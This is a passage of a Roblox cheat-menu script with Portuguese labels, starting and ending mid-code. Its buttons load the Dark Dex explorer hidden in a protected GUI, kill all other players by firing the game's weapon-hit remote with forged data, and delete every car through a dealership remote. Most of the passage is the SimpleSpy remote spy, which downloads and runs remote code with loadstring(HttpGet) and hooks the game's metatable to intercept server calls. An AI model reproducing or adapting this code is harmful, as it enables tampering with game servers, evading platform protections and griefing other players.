            createEntry(plrs.LocalPlayer.Name, plrs.LocalPlayer.UserId)
        
            -- create entries for all other players
            for _, v in pairs(plrs:GetPlayers()) do
                if v ~= plrs.LocalPlayer then
                    createEntry(v.Name, v.UserId)
                end
            end
            for i, v in pairs(game:GetService('Teams'):GetChildren()) do
                createTeamEntry(v)
            end
            listcons:GetPropertyChangedSignal('AbsoluteContentSize'):connect(
            function()
                c.CanvasSize = u2(0, 0, 0, listcons.AbsoluteContentSize.Y)
            end
            )
        
            itemll:GetPropertyChangedSignal('AbsoluteContentSize'):connect(
            function()
                items.CanvasSize = u2(0, 0, 0, itemll.AbsoluteContentSize.Y)
            end
            )
        
            plrs.PlayerAdded:connect(
                function(plr)
                    createEntry(plr.Name, plr.UserId)
                end
            )
        
            plrs.PlayerRemoving:connect(
                function(plr)
                    deleteEntry(plr.Name)
                    protected[plr.Name] = nil
                    tokill[plr.Name] = nil
                end
            )
        else
            local sound = Instance.new('Sound')
            sound.SoundId = 'rbxassetid://2130284653'
            sound.Parent = game:GetService('SoundService')
            sound:Play()
        
            game.StarterGui:SetCore(
                'SendNotification',
                {
                    Title = 'Já ta carregado',
                    Text = 'Carregando...',
                    Duration = 5
                }
            )
        end
  	end    
})
JogadorTab:AddButton({
	Name = "Dark Dex",
	Callback = function()
        local rng = Random.new()

        local charset = {}
        for i = 48,  57 do table.insert(charset, string.char(i)) end
        for i = 65,  90 do table.insert(charset, string.char(i)) end
        for i = 97, 122 do table.insert(charset, string.char(i)) end
        local function RandomCharacters(length)
            if length > 0 then
                return RandomCharacters(length - 1) .. charset[rng:NextInteger(1, #charset)]
            else
                return ''
            end
        end
        
        local Dex = game:GetObjects('rbxassetid://9553291002')[1]
        Dex.Name = RandomCharacters(rng:NextInteger(5, 20))
        Dex.DisplayOrder = 5
        -- credits iy
        if get_hidden_gui or gethui then
            local hiddenUI = get_hidden_gui or gethui
            Dex.Parent = hiddenUI()
        elseif (syn and syn.protect_gui) then
            syn.protect_gui(Dex)
            Dex.Parent = COREGUI
        end
        -- end
        local function Load(Obj, Url)
        local function GiveOwnGlobals(Func, Script)
            local Fenv = {}
            local RealFenv = {script = Script}
            local FenvMt = {}
            FenvMt.__index = function(a,b)
                if RealFenv[b] == nil then
                    return getfenv()[b]
                else
                    return RealFenv[b]
                end
            end
            FenvMt.__newindex = function(a, b, c)
                if RealFenv[b] == nil then
                    getfenv()[b] = c
                else
                    RealFenv[b] = c
                end
            end
            setmetatable(Fenv, FenvMt)
            setfenv(Func, Fenv)
            return Func
        end
        
        local function LoadScripts(Script)
            if Script.ClassName == "Script" or Script.ClassName == "LocalScript" then
                spawn(function()
                    GiveOwnGlobals(loadstring(Script.Source, "=" .. Script:GetFullName()), Script)()
                end)
            end
            for i,v in pairs(Script:GetChildren()) do
                LoadScripts(v)
            end
        end
        
        LoadScripts(Obj)
        end
        
        Load(Dex)
  	end    
})
KillTab:AddButton({
	Name = "Kill All (Pessoa com arma) (!)",
	Callback = function()
        local user, tool
        for i,p in next, game.Players:GetPlayers() do
            for i,v in next, p.Backpack:GetChildren() do
                if v:FindFirstChild("WeaponType") then
                    user, tool = p, v
                    break
                end
            end
        
            if tool then break end
            local c = p.Character
            local t = c and c:FindFirstChildOfClass("Tool")
            if t and t:FindFirstChild("WeaponType") then
                user, tool = p, t
            end
        end
        
        local rmt = game.ReplicatedStorage.WeaponsSystem.Network.WeaponHit
        local plr = game.Players.LocalPlayer
        
        for i,v in next, game.Players:GetPlayers() do
            if v ~= plr and v ~= user then
                local chr = v.Character
                local hum = chr:FindFirstChild("Humanoid")
                local head = chr:FindFirstChild("Head")
        
                rmt:FireServer(tool, {
                    ["p"] = head.Position,
                    ["pid"] = 1,
                    ["part"] = head,
                    ["d"] = 0,
                    ["maxDist"] = 0,
                    ["h"] = hum,
                    ["m"] = Enum.Material.Plastic,
                    ["n"] = Vector3.new(),
                    ["t"] = 0,
                    ["sid"] = 24
                })
            end
        end
  	end    
})
CarroTab:AddButton({
	Name = "Deletar Todos Os Carros",
	Callback = function()
        local args = {
            [1] = "dealership",
            [2] = "Fusca"
        }
        
        game:GetService("ReplicatedStorage").ConcessionariaRS.Remotes.Check:InvokeServer(unpack(args))
        wait(1)
  	end    
})
    JogadorTab:AddButton({
        Name = "Remote Spy",
        Callback = function()
            --[[
    SimpleSpy v2.2 SOURCE
 
    Credits:
        exx - basically everything
        Frosty - GUI to Lua
]]
 
-- shuts down the previous instance of SimpleSpy
if _G.SimpleSpyExecuted and type(_G.SimpleSpyShutdown) == "function" then
    _G.SimpleSpyShutdown()
end
 
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Highlight = loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/highlight.lua"))()
 
---- GENERATED (kinda sorta mostly) BY GUI to LUA ----
 
-- Instances:
 
local SimpleSpy2 = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local LeftPanel = Instance.new("Frame")
local LogList = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local RemoteTemplate = Instance.new("Frame")
local ColorBar = Instance.new("Frame")
local Text = Instance.new("TextLabel")
local Button = Instance.new("TextButton")
local RightPanel = Instance.new("Frame")
local CodeBox = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIGridLayout = Instance.new("UIGridLayout")
local FunctionTemplate = Instance.new("Frame")
local ColorBar_2 = Instance.new("Frame")
local Text_2 = Instance.new("TextLabel")
local Button_2 = Instance.new("TextButton")
local TopBar = Instance.new("Frame")
local Simple = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local MaximizeButton = Instance.new("TextButton")
local ImageLabel_2 = Instance.new("ImageLabel")
local MinimizeButton = Instance.new("TextButton")
local ImageLabel_3 = Instance.new("ImageLabel")
local ToolTip = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
 
--Properties:
 
SimpleSpy2.Name = "SimpleSpy2"
SimpleSpy2.ResetOnSpawn = false
 
Background.Name = "Background"
Background.Parent = SimpleSpy2
Background.BackgroundColor3 = Color3.new(1, 1, 1)
Background.BackgroundTransparency = 1
Background.Position = UDim2.new(0, 500, 0, 200)
Background.Size = UDim2.new(0, 450, 0, 268)
 
LeftPanel.Name = "LeftPanel"
LeftPanel.Parent = Background
LeftPanel.BackgroundColor3 = Color3.new(0.207843, 0.203922, 0.215686)
LeftPanel.BorderSizePixel = 0
LeftPanel.Position = UDim2.new(0, 0, 0, 19)
LeftPanel.Size = UDim2.new(0, 131, 0, 249)
 
LogList.Name = "LogList"
LogList.Parent = LeftPanel
LogList.Active = true
LogList.BackgroundColor3 = Color3.new(1, 1, 1)
LogList.BackgroundTransparency = 1
LogList.BorderSizePixel = 0
LogList.Position = UDim2.new(0, 0, 0, 9)
LogList.Size = UDim2.new(0, 131, 0, 232)
LogList.CanvasSize = UDim2.new(0, 0, 0, 0)
LogList.ScrollBarThickness = 4
 
UIListLayout.Parent = LogList
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
RemoteTemplate.Name = "RemoteTemplate"
RemoteTemplate.Parent = LogList
RemoteTemplate.BackgroundColor3 = Color3.new(1, 1, 1)
RemoteTemplate.BackgroundTransparency = 1
RemoteTemplate.Size = UDim2.new(0, 117, 0, 27)
 
ColorBar.Name = "ColorBar"
ColorBar.Parent = RemoteTemplate
ColorBar.BackgroundColor3 = Color3.new(1, 0.94902, 0)
ColorBar.BorderSizePixel = 0
ColorBar.Position = UDim2.new(0, 0, 0, 1)
ColorBar.Size = UDim2.new(0, 7, 0, 18)
ColorBar.ZIndex = 2
 
Text.Name = "Text"
Text.Parent = RemoteTemplate
Text.BackgroundColor3 = Color3.new(1, 1, 1)
Text.BackgroundTransparency = 1
Text.Position = UDim2.new(0, 12, 0, 1)
Text.Size = UDim2.new(0, 105, 0, 18)
Text.ZIndex = 2
Text.Font = Enum.Font.SourceSans
Text.Text = "TEXT"
Text.TextColor3 = Color3.new(1, 1, 1)
Text.TextSize = 14
Text.TextXAlignment = Enum.TextXAlignment.Left
 
Button.Name = "Button"
Button.Parent = RemoteTemplate
Button.BackgroundColor3 = Color3.new(0, 0, 0)
Button.BackgroundTransparency = 0.75
Button.BorderColor3 = Color3.new(1, 1, 1)
Button.Position = UDim2.new(0, 0, 0, 1)
Button.Size = UDim2.new(0, 117, 0, 18)
Button.AutoButtonColor = false
Button.Font = Enum.Font.SourceSans
Button.Text = ""
Button.TextColor3 = Color3.new(0, 0, 0)
Button.TextSize = 14
 
RightPanel.Name = "RightPanel"
RightPanel.Parent = Background
RightPanel.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
RightPanel.BorderSizePixel = 0
RightPanel.Position = UDim2.new(0, 131, 0, 19)
RightPanel.Size = UDim2.new(0, 319, 0, 249)
 
CodeBox.Name = "CodeBox"
CodeBox.Parent = RightPanel
CodeBox.BackgroundColor3 = Color3.new(0.0823529, 0.0745098, 0.0784314)
CodeBox.BorderSizePixel = 0
CodeBox.Size = UDim2.new(0, 319, 0, 119)
 
ScrollingFrame.Parent = RightPanel
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.Position = UDim2.new(0, 0, 0.5, 0)
ScrollingFrame.Size = UDim2.new(1, 0, 0.5, -9)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.ScrollBarThickness = 4
 
UIGridLayout.Parent = ScrollingFrame
UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
UIGridLayout.CellSize = UDim2.new(0, 94, 0, 27)
 
FunctionTemplate.Name = "FunctionTemplate"
FunctionTemplate.Parent = ScrollingFrame
FunctionTemplate.BackgroundColor3 = Color3.new(1, 1, 1)
FunctionTemplate.BackgroundTransparency = 1
FunctionTemplate.Size = UDim2.new(0, 117, 0, 23)
 
ColorBar_2.Name = "ColorBar"
ColorBar_2.Parent = FunctionTemplate
ColorBar_2.BackgroundColor3 = Color3.new(1, 1, 1)
ColorBar_2.BorderSizePixel = 0
ColorBar_2.Position = UDim2.new(0, 7, 0, 10)
ColorBar_2.Size = UDim2.new(0, 7, 0, 18)
ColorBar_2.ZIndex = 3
 
Text_2.Name = "Text"
Text_2.Parent = FunctionTemplate
Text_2.BackgroundColor3 = Color3.new(1, 1, 1)
Text_2.BackgroundTransparency = 1
Text_2.Position = UDim2.new(0, 19, 0, 10)
Text_2.Size = UDim2.new(0, 69, 0, 18)
Text_2.ZIndex = 2
Text_2.Font = Enum.Font.SourceSans
Text_2.Text = "TEXT"
Text_2.TextColor3 = Color3.new(1, 1, 1)
Text_2.TextSize = 14
Text_2.TextStrokeColor3 = Color3.new(0.145098, 0.141176, 0.14902)
Text_2.TextXAlignment = Enum.TextXAlignment.Left
 
Button_2.Name = "Button"
Button_2.Parent = FunctionTemplate
Button_2.BackgroundColor3 = Color3.new(0, 0, 0)
Button_2.BackgroundTransparency = 0.69999998807907
Button_2.BorderColor3 = Color3.new(1, 1, 1)
Button_2.Position = UDim2.new(0, 7, 0, 10)
Button_2.Size = UDim2.new(0, 80, 0, 18)
Button_2.AutoButtonColor = false
Button_2.Font = Enum.Font.SourceSans
Button_2.Text = ""
Button_2.TextColor3 = Color3.new(0, 0, 0)
Button_2.TextSize = 14
 
TopBar.Name = "TopBar"
TopBar.Parent = Background
TopBar.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
TopBar.BorderSizePixel = 0
TopBar.Size = UDim2.new(0, 450, 0, 19)
 
Simple.Name = "Simple"
Simple.Parent = TopBar
Simple.BackgroundColor3 = Color3.new(1, 1, 1)
Simple.AutoButtonColor = false
Simple.BackgroundTransparency = 1
Simple.Position = UDim2.new(0, 5, 0, 0)
Simple.Size = UDim2.new(0, 57, 0, 18)
Simple.Font = Enum.Font.SourceSansBold
Simple.Text = "SimpleSpy"
Simple.TextColor3 = Color3.new(1, 1, 1)
Simple.TextSize = 14
Simple.TextXAlignment = Enum.TextXAlignment.Left
 
CloseButton.Name = "CloseButton"
CloseButton.Parent = TopBar
CloseButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
CloseButton.BorderSizePixel = 0
CloseButton.Position = UDim2.new(1, -19, 0, 0)
CloseButton.Size = UDim2.new(0, 19, 0, 19)
CloseButton.Font = Enum.Font.SourceSans
CloseButton.Text = ""
CloseButton.TextColor3 = Color3.new(0, 0, 0)
CloseButton.TextSize = 14
 
ImageLabel.Parent = CloseButton
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0, 5, 0, 5)
ImageLabel.Size = UDim2.new(0, 9, 0, 9)
ImageLabel.Image = "http://www.roblox.com/asset/?id=5597086202"
 
MaximizeButton.Name = "MaximizeButton"
MaximizeButton.Parent = TopBar
MaximizeButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
MaximizeButton.BorderSizePixel = 0
MaximizeButton.Position = UDim2.new(1, -38, 0, 0)
MaximizeButton.Size = UDim2.new(0, 19, 0, 19)
MaximizeButton.Font = Enum.Font.SourceSans
MaximizeButton.Text = ""
MaximizeButton.TextColor3 = Color3.new(0, 0, 0)
MaximizeButton.TextSize = 14
 
ImageLabel_2.Parent = MaximizeButton
ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel_2.BackgroundTransparency = 1
ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
ImageLabel_2.Size = UDim2.new(0, 9, 0, 9)
ImageLabel_2.Image = "http://www.roblox.com/asset/?id=5597108117"
 
MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Parent = TopBar
MinimizeButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
MinimizeButton.BorderSizePixel = 0
MinimizeButton.Position = UDim2.new(1, -57, 0, 0)
MinimizeButton.Size = UDim2.new(0, 19, 0, 19)
MinimizeButton.Font = Enum.Font.SourceSans
MinimizeButton.Text = ""
MinimizeButton.TextColor3 = Color3.new(0, 0, 0)
MinimizeButton.TextSize = 14
 
ImageLabel_3.Parent = MinimizeButton
ImageLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel_3.BackgroundTransparency = 1
ImageLabel_3.Position = UDim2.new(0, 5, 0, 5)
ImageLabel_3.Size = UDim2.new(0, 9, 0, 9)
ImageLabel_3.Image = "http://www.roblox.com/asset/?id=5597105827"
 
ToolTip.Name = "ToolTip"
ToolTip.Parent = SimpleSpy2
ToolTip.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
ToolTip.BackgroundTransparency = 0.1
ToolTip.BorderColor3 = Color3.new(1, 1, 1)
ToolTip.Size = UDim2.new(0, 200, 0, 50)
ToolTip.ZIndex = 3
ToolTip.Visible = false
 
TextLabel.Parent = ToolTip
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(0, 2, 0, 2)
TextLabel.Size = UDim2.new(0, 196, 0, 46)
TextLabel.ZIndex = 3
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "This is some slightly longer text."
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 14
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextYAlignment = Enum.TextYAlignment.Top
 
-------------------------------------------------------------------------------
-- init
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ContentProvider = game:GetService("ContentProvider")
local TextService = game:GetService("TextService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
 
local selectedColor = Color3.new(0.321569, 0.333333, 1)
local deselectedColor = Color3.new(0.8, 0.8, 0.8)
--- So things are descending
local layoutOrderNum = 999999999
--- Whether or not the gui is closing
local mainClosing = false
--- Whether or not the gui is closed (defaults to false)
local closed = false
--- Whether or not the sidebar is closing
local sideClosing = false
--- Whether or not the sidebar is closed (defaults to true but opens automatically on remote selection)
local sideClosed = false
--- Whether or not the code box is maximized (defaults to false)
local maximized = false
--- The event logs to be read from
local logs = {}
--- The event currently selected.Log (defaults to nil)
local selected = nil
--- The blacklist (can be a string name or the Remote Instance)
local blacklist = {}
--- The block list (can be a string name or the Remote Instance)
local blocklist = {}
--- Whether or not to add getNil function
local getNil = false
--- Array of remotes (and original functions) connected to
local connectedRemotes = {}
--- True = hookfunction, false = namecall
local toggle = false
local gm = getrawmetatable(game)
local original = gm.__namecall
setreadonly(gm, false)
--- used to prevent recursives
local prevTables = {}
--- holds logs (for deletion)
local remoteLogs = {}
--- used for hookfunction
local remoteEvent = Instance.new("RemoteEvent")
--- used for hookfunction
local remoteFunction = Instance.new("RemoteFunction")
local originalEvent = remoteEvent.FireServer
local originalFunction = remoteFunction.InvokeServer
--- the maximum amount of remotes allowed in logs
_G.SIMPLESPYCONFIG_MaxRemotes = 500
--- how many spaces to indent
local indent = 4
--- used for task scheduler
local scheduled = {}
--- RBXScriptConnect of the task scheduler
local schedulerconnect
local SimpleSpy = {}
local topstr = ""
local bottomstr = ""
local remotesFadeIn
local rightFadeIn
local codebox
local p
local getnilrequired = false
 
-- autoblock variables
local autoblock = false
local history = {}
local excluding = {}
 
-- function info variables
local funcEnabled = true
 
-- remote hooking/connecting api variables
local remoteSignals = {}
local remoteHooks = {}
 
-- original mouse icon
local oldIcon = Mouse.Icon
 
-- if mouse inside gui
local mouseInGui = false
 
-- handy array of RBXScriptConnections to disconnect on shutdown
local connections = {}
 
-- whether or not SimpleSpy uses 'getcallingscript()' to get the script (default is false because detection)
local useGetCallingScript = false
 
-- functions
 
--- Converts arguments to a string and generates code that calls the specified method with them, recommended to be used in conjunction with ValueToString (method must be a string, e.g. `game:GetService("ReplicatedStorage").Remote:FireServer`)
--- @param method string
--- @param args any[]
--- @return string
function SimpleSpy:ArgsToString(method, args)
    assert(typeof(method) == "string", "string expected, got " .. typeof(method))
    assert(typeof(args) == "table", "table expected, got " .. typeof(args))
    return v2v({args = args}) .. "\n\n" .. method .. "(unpack(args))"
end
 
--- Converts a value to variables with the specified index as the variable name (if nil/invalid then the name will be assigned automatically)
--- @param t any[]
--- @return string
function SimpleSpy:TableToVars(t)
    assert(typeof(t) == "table", "table expected, got " .. typeof(t))
    return v2v(t)
end
 
--- Converts a value to a variable with the specified `variablename` (if nil/invalid then the name will be assigned automatically)
--- @param value any
--- @return string
function SimpleSpy:ValueToVar(value, variablename)
    assert(variablename == nil or typeof(variablename) == "string", "string expected, got " .. typeof(variablename))
    if not variablename then
        variablename = 1
    end
    return v2v({[variablename] = value})
end
 
--- Converts any value to a string, cannot preserve function contents
--- @param value any
--- @return string
function SimpleSpy:ValueToString(value)
    return v2s(value)
end
 
--- Generates the simplespy function info
--- @param func function
--- @return string
function SimpleSpy:GetFunctionInfo(func)
    assert(typeof(func) == "function", "Instance expected, got " .. typeof(func))
    return v2v{functionInfo = {
        info = debug.getinfo(func),
        constants = debug.getconstants(func)
    }}
end
 
--- Gets the ScriptSignal for a specified remote being fired
--- @param remote Instance
function SimpleSpy:GetRemoteFiredSignal(remote)
    assert(typeof(remote) == "Instance", "Instance expected, got " .. typeof(remote))
    if not remoteSignals[remote] then
        remoteSignals[remote] = newSignal()
    end
    return remoteSignals[remote]
end
 
--- Allows for direct hooking of remotes **THIS CAN BE VERY DANGEROUS**
--- @param remote Instance
--- @param f function
function SimpleSpy:HookRemote(remote, f)
    assert(typeof(remote) == "Instance", "Instance expected, got " .. typeof(remote))
    assert(typeof(f) == "function", "function expected, got " .. typeof(f))
    remoteHooks[remote] = f
end
 
--- Blocks the specified remote instance/string
--- @param remote any
function SimpleSpy:BlockRemote(remote)
    assert(typeof(remote) == "Instance" or typeof(remote) == "string", "Instance | string expected, got " .. typeof(remote))
    blocklist[remote] = true
end
 
--- Excludes the specified remote from logs (instance/string)
--- @param remote any
function SimpleSpy:ExcludeRemote(remote)
    assert(typeof(remote) == "Instance" or typeof(remote) == "string", "Instance | string expected, got " .. typeof(remote))
    blacklist[remote] = true
end
 
--- Creates a new ScriptSignal that can be connected to and fired
--- @return table
function newSignal()
    local connected = {}
    return {
        Connect = function(self, f)
            assert(connected, "Signal is closed")
            connected[tostring(f)] = f
            return setmetatable({
                Connected = true,
                Disconnect = function(self)
                    if not connected then
                        warn("Signal is already closed")
                    end
                    self.Connected = false
                    connected[tostring(f)] = nil
                end
            },
            {
                __index = function(self, i)
                    if i == "Connected" then
                        return not not connected[tostring(f)]
                    end
                end
            })
        end,
        Fire = function(self, ...)
            for _, f in pairs(connected) do
                coroutine.wrap(f)(...)
            end
        end
    }
end
 
--- Prevents remote spam from causing lag (clears logs after `_G.SIMPLESPYCONFIG_MaxRemotes` or 500 remotes)
function clean()
    local max = _G.SIMPLESPYCONFIG_MaxRemotes
    if not typeof(max) == "number" and math.floor(max) ~= max then
        max = 500
    end
    if #remoteLogs > max then
        for i = 100, #remoteLogs do
            local v = remoteLogs[i]
            if typeof(v[1]) == "RBXScriptConnection" then
                v[1]:Disconnect()
            end
            if typeof(v[2]) == "Instance" then
                v[2]:Destroy()
            end
        end
        local newLogs = {}
        for i = 1, 100 do
            table.insert(newLogs, remoteLogs[i])
        end
        remoteLogs = newLogs
    end
end
 
--- Scales the ToolTip to fit containing text
function scaleToolTip()
    local size = TextService:GetTextSize(TextLabel.Text, TextLabel.TextSize, TextLabel.Font, Vector2.new(196, math.huge))
    TextLabel.Size = UDim2.new(0, size.X, 0, size.Y)
    ToolTip.Size = UDim2.new(0, size.X + 4, 0, size.Y + 4)
end
 
--- Executed when the toggle button (the SimpleSpy logo) is hovered over
function onToggleButtonHover()
    if not toggle then
        TweenService:Create(Simple, TweenInfo.new(0.5), {TextColor3 = Color3.fromRGB(252, 51, 51)}):Play()
    else
        TweenService:Create(Simple, TweenInfo.new(0.5), {TextColor3 = Color3.fromRGB(68, 206, 91)}):Play()
    end
end
 
--- Executed when the toggle button is unhovered over
function onToggleButtonUnhover()
    TweenService:Create(Simple, TweenInfo.new(0.5), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
end
 
--- Executed when the X button is hovered over
function onXButtonHover()
    TweenService:Create(CloseButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 60, 60)}):Play()
end
 
--- Executed when the X button is unhovered over
function onXButtonUnhover()
    TweenService:Create(CloseButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(37, 36, 38)}):Play()
end
 
--- Toggles the remote spy method (when button clicked)
function onToggleButtonClick()
    if toggle then
        TweenService:Create(Simple, TweenInfo.new(0.5), {TextColor3 = Color3.fromRGB(252, 51, 51)}):Play()
    else
        TweenService:Create(Simple, TweenInfo.new(0.5), {TextColor3 = Color3.fromRGB(68, 206, 91)}):Play()
    end
    toggleSpyMethod()
end
 
--- Reconnects bringBackOnResize if the current viewport changes and also connects it initially
function connectResize()
    local lastCam = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(bringBackOnResize)
    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
        lastCam:Disconnect()
        if workspace.CurrentCamera then
            lastCam = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(bringBackOnResize)
        end
    end)
end
 
--- Brings gui back if it gets lost offscreen (connected to the camera viewport changing)
function bringBackOnResize()
    local currentX = Background.AbsolutePosition.X
    local currentY = Background.AbsolutePosition.Y
    local viewportSize = workspace.CurrentCamera.ViewportSize
    if (currentX < 0) or (currentX > (viewportSize.X - (sideClosed and 131 or TopBar.AbsoluteSize.X))) then
        if currentX < 0 then
            currentX = 0
        else
            currentX = viewportSize.X - (sideClosed and 131 or TopBar.AbsoluteSize.X)
        end
    end
    if (currentY < 0) or (currentY > (viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36)) then
        if currentY < 0 then
            currentY = 0
        else
            currentY = viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36
        end
    end
    TweenService.Create(TweenService, Background, TweenInfo.new(0.1), {Position = UDim2.new(0, currentX, 0, currentY)}):Play()
end
 
--- Drags gui (so long as mouse is held down)
function onBarInput(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        local lastPos = UserInputService.GetMouseLocation(UserInputService)
        local mainPos = Background.AbsolutePosition
        local offset = mainPos - lastPos
        local currentPos = offset + lastPos
        RunService.BindToRenderStep(RunService, "drag", 1,
            function()
                local newPos = UserInputService.GetMouseLocation(UserInputService)
                if newPos ~= lastPos then
                    local currentX = (offset + newPos).X
                    local currentY = (offset + newPos).Y
                    local viewportSize = workspace.CurrentCamera.ViewportSize
                    if (currentX < 0 and currentX < currentPos.X) or (currentX > (viewportSize.X - (sideClosed and 131 or TopBar.AbsoluteSize.X)) and currentX > currentPos.X) then
                        if currentX < 0 then
                            currentX = 0
                        else
                            currentX = viewportSize.X - (sideClosed and 131 or TopBar.AbsoluteSize.X)
                        end
                    end
                    if (currentY < 0 and currentY < currentPos.Y) or (currentY > (viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36) and currentY > currentPos.Y) then
                        if currentY < 0 then
                            currentY = 0
                        else
                            currentY = viewportSize.Y - (closed and 19 or Background.AbsoluteSize.Y) - 36
                        end
                    end
                    currentPos = Vector2.new(currentX, currentY)
                    lastPos = newPos
                    TweenService.Create(TweenService, Background, TweenInfo.new(0.1), {Position = UDim2.new(0, currentPos.X, 0, currentPos.Y)}):Play()
                end
                if not UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
                    RunService.UnbindFromRenderStep(RunService, "drag")
                end
            end
        )
    end
end
 
--- Fades out the table of elements (and makes them invisible), returns a function to make them visible again
function fadeOut(elements)
    local data = {}
    for _, v in pairs(elements) do
        if typeof(v) == "Instance" and v:IsA("GuiObject") and v.Visible then
            coroutine.wrap(function()
                data[v] = {
                    BackgroundTransparency = v.BackgroundTransparency
                }
                TweenService:Create(v, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
                if v:IsA("TextBox") or v:IsA("TextButton") or v:IsA("TextLabel") then
                    data[v].TextTransparency = v.TextTransparency
                    TweenService:Create(v, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
                elseif v:IsA("ImageButton") or v:IsA("ImageLabel") then
                    data[v].ImageTransparency = v.ImageTransparency
                    TweenService:Create(v, TweenInfo.new(0.5), {ImageTransparency = 1}):Play()
                end
                wait(0.5)
                v.Visible = false
                for i, x in pairs(data[v]) do
                    v[i] = x
                end
                data[v] = true
            end)()
        end
    end
    return function()
        for i, _ in pairs(data) do
            coroutine.wrap(function()
                local properties = {
                    BackgroundTransparency = i.BackgroundTransparency
                }
                i.BackgroundTransparency = 1
                TweenService:Create(i, TweenInfo.new(0.5), {BackgroundTransparency = properties.BackgroundTransparency}):Play()
                if i:IsA("TextBox") or i:IsA("TextButton") or i:IsA("TextLabel") then
                    properties.TextTransparency = i.TextTransparency
                    i.TextTransparency = 1
                    TweenService:Create(i, TweenInfo.new(0.5), {TextTransparency = properties.TextTransparency}):Play()
                elseif i:IsA("ImageButton") or i:IsA("ImageLabel") then
                    properties.ImageTransparency = i.ImageTransparency
                    i.ImageTransparency = 1
                    TweenService:Create(i, TweenInfo.new(0.5), {ImageTransparency = properties.ImageTransparency}):Play()
                end
                i.Visible = true
            end)()
        end
    end
end
 
--- Expands and minimizes the gui (closed is the toggle boolean)
function toggleMinimize(override)
    if mainClosing and not override or maximized then
        return
    end
    mainClosing = true
    closed = not closed
    if closed then
        if not sideClosed then
            toggleSideTray(true)
        end
        LeftPanel.Visible = true
        TweenService:Create(LeftPanel, TweenInfo.new(0.5), {Size = UDim2.new(0, 131, 0, 0)}):Play()
        wait(0.5)
        remotesFadeIn = fadeOut(LeftPanel:GetDescendants())
        wait(0.5)
    else
        TweenService:Create(LeftPanel, TweenInfo.new(0.5), {Size = UDim2.new(0, 131, 0, 249)}):Play()
        wait(0.5)
        if remotesFadeIn then
            remotesFadeIn()
            remotesFadeIn = nil
        end
        bringBackOnResize()
    end
    mainClosing = false
end
 
--- Expands and minimizes the sidebar (sideClosed is the toggle boolean)
function toggleSideTray(override)
    if sideClosing and not override or maximized then
        return
    end
    sideClosing = true
    sideClosed = not sideClosed
    if sideClosed then
        rightFadeIn = fadeOut(RightPanel:GetDescendants())
        wait(0.5)
        minimizeSize(0.5)
        wait(0.5)
        RightPanel.Visible = false
    else
        if closed then
            toggleMinimize(true)
        end
        RightPanel.Visible = true
        maximizeSize(0.5)
        wait(0.5)
        if rightFadeIn then
            rightFadeIn()
        end
        bringBackOnResize()
    end
    sideClosing = false
end
 
--- Expands code box to fit screen for more convenient viewing
function toggleMaximize()
    if not sideClosed and not maximized then
        maximized = true
        local disable = Instance.new("TextButton")
        local prevSize = UDim2.new(0, CodeBox.AbsoluteSize.X, 0, CodeBox.AbsoluteSize.Y)
        local prevPos = UDim2.new(0,CodeBox.AbsolutePosition.X, 0, CodeBox.AbsolutePosition.Y)
        disable.Size = UDim2.new(1, 0, 1, 0)
        disable.BackgroundColor3 = Color3.new()
        disable.BorderSizePixel = 0
        disable.Text = 0
        disable.ZIndex = 3
        disable.BackgroundTransparency = 1
        disable.AutoButtonColor = false
        CodeBox.ZIndex = 4
        CodeBox.Position = prevPos
        CodeBox.Size = prevSize
